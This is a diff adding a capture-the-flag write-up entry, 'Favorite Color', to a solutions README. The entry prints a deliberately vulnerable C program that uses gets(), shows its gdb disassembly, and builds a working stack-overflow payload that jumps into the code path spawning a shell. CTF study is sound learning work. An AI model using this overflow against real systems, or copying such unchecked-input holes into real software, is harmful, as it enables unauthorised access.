@@ -47,6 +47,7 @@
 	* [Inj3ction Time](#inj3ction-time)
 * [Binary](#binary)
 	* [Lazy Game Challenge](#lazy-game-challenge)
+	* [Favorite Color](#favorite-color)
 * [Misc](#misc)
 	* [Help Bity](#help-bity)
 * [Programming](#programming)
@@ -709,6 +710,112 @@ I found an interesting game made by some guy named "John_123". It is some bettin
 To get flag, pwn the server at `nc thekidofarcrania.com 10001`
 
 The key point is that it's hard to win, so when you place a bet, input a negative number (for example: -1000000000) and then you can loose the game as you like it. Each time you loose a game, you gain some money. And when the game ends, you will get the flag.
+
+### Favorite Color
+
+*Medium*
+
+Discription: What's your favorite color? Would you like to share with me? Run the command: ssh color@104.131.79.111 -p 1001 (pw: guest) to tell me!
+
+We can see an ELF color, a color.c and a flag.txt.
+If we try to `cat flag.txt`, we will get "Permission denied".
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int vuln() {
+    char buf[32];
+    
+    printf("Enter your favorite color: ");
+    gets(buf);
+    
+    int good = 0;
+    for (int i = 0; buf[i]; i++) {
+        good &= buf[i] ^ buf[i];
+    }
+    
+    return good;
+}
+
+int main(char argc, char** argv) {
+    setresuid(getegid(), getegid(), getegid());
+    setresgid(getegid(), getegid(), getegid());
+    
+    //disable buffering.
+    setbuf(stdout, NULL);
+    
+    if (vuln()) {
+        puts("Me too! That's my favorite color too!");
+        puts("You get a shell! Flag is in flag.txt");
+        system("/bin/sh");
+    } else {
+        puts("Boo... I hate that color! :(");
+    }
+}
+```
+
+So we can see, if `good = 1`, we can get the flag. The case is `buf[i] ^ buf[i]`always equals 0 and `good = 0`, so in a normal case, good will always be 0.
+Here we want to execute the body of `if` instead of `else`.
+
+```bash
+$(prob).o: $(prob).c
+	cc -c -m32 -fno-stack-protector $(prob).c
+```
+
+We can see it disables stack-smashing protector.
+Here `gets()` puts a string into buff[32], if the string is bigger than 32, it will smash the stack.
+
+`gdb ./color` and `disassemble vuln`
+
+We got
+
+```asm
+   0x0804858b <+0>:	push   %ebp
+   0x0804858c <+1>:	mov    %esp,%ebp
+   0x0804858e <+3>:	sub    $0x38,%esp
+   0x08048591 <+6>:	sub    $0xc,%esp
+   0x08048594 <+9>:	push   $0x8048730
+   0x08048599 <+14>:	call   0x8048410 <printf@plt>
+   0x0804859e <+19>:	add    $0x10,%esp
+   0x080485a1 <+22>:	sub    $0xc,%esp
+   0x080485a4 <+25>:	lea    -0x30(%ebp),%eax
+   0x080485a7 <+28>:	push   %eax
+   0x080485a8 <+29>:	call   0x8048420 <gets@plt>
+   0x080485ad <+34>:	add    $0x10,%esp
+   0x080485b0 <+37>:	movl   $0x0,-0xc(%ebp)
+   0x080485b7 <+44>:	movl   $0x0,-0x10(%ebp)
+   0x080485be <+51>:	jmp    0x80485cb <vuln+64>
+   0x080485c0 <+53>:	movl   $0x0,-0xc(%ebp)
+   0x080485c7 <+60>:	addl   $0x1,-0x10(%ebp)
+   0x080485cb <+64>:	lea    -0x30(%ebp),%edx
+   0x080485ce <+67>:	mov    -0x10(%ebp),%eax
+   0x080485d1 <+70>:	add    %edx,%eax
+   0x080485d3 <+72>:	movzbl (%eax),%eax
+   0x080485d6 <+75>:	test   %al,%al
+---Type <return> to continue, or q <return> to quit---
+   0x080485d8 <+77>:	jne    0x80485c0 <vuln+53>
+   0x080485da <+79>:	mov    -0xc(%ebp),%eax
+   0x080485dd <+82>:	leave
+   0x080485de <+83>:	ret
+```
+
+Let's find `gets()`, here 48 bytes for the `buf[32]` and `ebp` is 4 bytes(32 bits). So 52 bytes can make you smash the stack. And then it can return to where we want, in the last 4 bytes after these 52 bytes.
+`disassemble main` to see `0x0804864e <+111>:	call   0x804858b <vuln>`, it calls vuln at `0x804858b`.
+
+```
+   0x08048653 <+116>:	test   %eax,%eax
+   0x08048655 <+118>:	je     0x8048689 <main+170>
+   0x08048657 <+120>:	sub    $0xc,%esp
+```
+
+If 0, it jumps to `0x8048689`. If the other brach, it should be `0x08048657`.
+So `lscpu` and know it's `Little Endian`. So it should be `57 86 04 08`.
+So the payload can be `52A + \x57\x86\x04\x08`.
+
+`(python -c 'print(52 * "A" + "\x57\x86\x04\x08")' ;cat) | ./color `
+
 
 ## Misc
 
